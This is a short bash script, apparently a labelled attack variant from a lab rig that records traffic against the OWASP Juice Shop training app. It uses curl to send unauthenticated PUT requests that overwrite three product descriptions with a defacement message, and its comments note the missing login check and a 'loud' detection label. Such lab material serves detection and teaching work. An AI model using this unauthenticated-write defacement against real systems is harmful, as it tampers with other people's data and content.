#!/usr/bin/env bash
# ATK-15 variant a: rewrites three product descriptions with his message. PUT /api/Products/:id has
# no login check in Juice Shop. curl's own user agent (loud).
# Runs inside the rig's tools container only (recording/record.sh).
# tool: curl 8.x
# label: loud: three product descriptions rewritten, no login, curl user agent
set -eu
for id in 1 2 3; do
  curl -s -X PUT "http://10.66.0.10/api/Products/$id" -H 'Content-Type: application/json' \
    --data-raw '{"description":"This juice has gone sour. Every bottle here now belongs to Death."}' | head -c 200
  echo
done
